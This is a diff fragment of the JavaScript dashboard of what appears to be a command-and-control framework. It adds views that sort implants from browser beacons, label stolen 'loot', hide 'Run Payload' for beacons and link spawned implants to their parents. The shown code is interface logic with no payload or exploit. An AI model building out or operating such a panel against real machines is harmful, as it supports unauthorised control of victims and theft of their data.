+    const appCount = clientsJson.filter(c => c.clientType !== 'bex-beacon').length;
+    const browserCount = clientsJson.filter(c => c.clientType === 'bex-beacon').length;
+    const statsEl = document.getElementById('client-stats');
+    if (statsEl) {
+        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b>`;
+    }
+
 	// Start setting up the client cards
 	var cardStack = document.getElementById('client-stack');
 
@@ -2578,8 +2812,48 @@ async function updateClients()
 	// Sort the clients
 	var jsonResponse = await sortClients(clientsJson);
 
+    const showBeacons = document.getElementById('toggleBrowsers').checked;
+
+    // Auto-Select Logic: When switching types, load the last selected client of that type
+    if (showBeacons) {
+        if (selectedClientId !== lastSelectedBrowserId) {
+            selectedClientId = lastSelectedBrowserId;
+            if (selectedClientId) getClientDetails(selectedClientId);
+        }
+    } else {
+        if (selectedClientId !== lastSelectedAppId) {
+            selectedClientId = lastSelectedAppId;
+            if (selectedClientId) getClientDetails(selectedClientId);
+        }
+    }
+
+    // Auto-refresh detail view if a beacon is selected (to update injection status)
+    if (selectedClientId && !refreshingDetails) {
+        const selectedClient = clientsJson.find(c => c.id == selectedClientId);
+        if (selectedClient && selectedClient.clientType === 'bex-beacon') {
+            getClientDetails(selectedClientId);
+        }
+    }
+
 	// We need to filter the clients here too
 	jsonResponse = filterClients(jsonResponse);
+
+    // Handle Loot Header based on Selected Client (factually representing what's shown)
+    const lootHeader = document.getElementById('loot-header-text');
+    
+    if (selectedClientId) {
+        // Find the selected client in the FULL list
+        const selectedClient = clientsJson.find(c => c.id == selectedClientId);
+        if (selectedClient && lootHeader) {
+            const label = selectedClient.clientType === 'bex-beacon' ? "Browser Loot" : "App Loot";
+            lootHeader.innerHTML = `<b>&nbsp;&nbsp;${label}</b>`;
+        }
+	} else {
+        // No selection
+        if (lootHeader) {
+            lootHeader.innerHTML = showBeacons ? "<b>&nbsp;&nbsp;Browser Loot</b>" : "<b>&nbsp;&nbsp;App Loot</b>";
+        }
+    }
 
 	var topCount = parseInt(clientLoadCount) + parseInt(clientLoadExtraCount);
 
@@ -2594,6 +2868,11 @@ async function updateClients()
 	for (let i = 0; i < topCount; i++)
 	{
 		client = jsonResponse[i];
+
+		// Filter by client type toggle
+		const showBeacons = document.getElementById('toggleBrowsers').checked;
+		if (showBeacons && client.clientType !== 'bex-beacon') continue;
+		if (!showBeacons && client.clientType === 'bex-beacon') continue;
 
 		if (document.getElementById('onlyStarredClients').checked == true)
 		{
@@ -2701,25 +2980,89 @@ async function updateClients()
   cardText.innerHTML += "<br>Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
   cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + client.browser + "</b>";
 
-  if (client.hasJobs)
-  {
-  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
-  	+ client.id + `'`+ ')>Run Payload</button>';  
-  }	
-  else
-  {
-  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
-  	+ client.id + `'`+ ')>Run Payload</button>';
+  if (client.clientType !== 'bex-beacon') {
+    if (client.hasJobs)
+    {
+      cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
+      + client.id + `'`+ ')>Run Payload</button>';  
+    }	
+    else
+    {
+      cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
+      + client.id + `'`+ ')>Run Payload</button>';
+    }
   }
 
 
   cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
   cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";
 
+  if (client.clientType !== 'bex-beacon' && client.domain) {
+      cardSubtitle.innerHTML += "<br>Domain: <b>" + client.domain + "</b>";
+  }
 
   cardBody.appendChild(cardTitle);
   cardBody.appendChild(cardSubtitle);
   cardBody.appendChild(cardText);
+
+  // Add child client summary if it's a beacon
+  if (client.clientType === 'bex-beacon') {
+      const myChildren = clientsJson.filter(c => c.parentUUID === client.uuid);
+      if (myChildren.length > 0) {
+          var childrenDiv = document.createElement('div');
+          childrenDiv.className = 'mt-2 border-top pt-2';
+          childrenDiv.innerHTML = `<small class="text-muted">Spawned Implants:</small>`;
+          
+          myChildren.forEach(child => {
+              var childBadge = document.createElement('div');
+              childBadge.className = 'badge bg-dark text-white me-1 p-1';
+              childBadge.style.cursor = 'pointer';
+              const name = child.tag ? `${escapeHTML(child.tag)}/${escapeHTML(child.nickname)}` : escapeHTML(child.nickname);
+              childBadge.innerHTML = `<small>${name}</small>`;
+              childBadge.onclick = (e) => {
+                  e.stopPropagation();
+                  // Select this child
+                  // First ensure we are showing Apps
+                  document.getElementById('toggleApps').click();
+                  
+                  // Wait for update to finish then click
+                  setTimeout(() => {
+                      const childCard = document.getElementById('clientCard' + child.id);
+                      if (childCard) childCard.click();
+                  }, 100);
+              };
+              childrenDiv.appendChild(childBadge);
+          });
+          cardBody.appendChild(childrenDiv);
+      }
+  } else if (client.parentUUID) {
+      // Add "Spawned By" link for child implants
+      const parent = clientsJson.find(c => c.uuid === client.parentUUID);
+      if (parent) {
+          var parentDiv = document.createElement('div');
+          parentDiv.className = 'mt-2 border-top pt-2';
+          parentDiv.innerHTML = `<small class="text-muted">Spawned By:</small> `;
+          
+          var parentBadge = document.createElement('div');
+          parentBadge.className = 'badge bg-info text-dark p-1';
+          parentBadge.style.cursor = 'pointer';
+          const name = parent.tag ? `${escapeHTML(parent.tag)}/${escapeHTML(parent.nickname)}` : escapeHTML(parent.nickname);
+          parentBadge.innerHTML = `<small>${name}</small>`;
+          parentBadge.onclick = (e) => {
+              e.stopPropagation();
+              // Switch to Browsers
+              document.getElementById('toggleBrowsers').click();
+              
+              // Wait for update then click parent
+              setTimeout(() => {
+                  const parentCard = document.getElementById('clientCard' + parent.id);
+                  if (parentCard) parentCard.click();
+              }, 100);
+          };
+          parentDiv.appendChild(parentBadge);
+          cardBody.appendChild(parentDiv);
+      }
+  }
 
   card.appendChild(cardBody);
 
@@ -2732,9 +3075,8 @@ async function updateClients()
   	getClientDetails(selectedClientId);
   };
 
-  cardStack.appendChild(card);
-
-}
+  cardStack.appendChild(card);    	
+  }
 
 
 
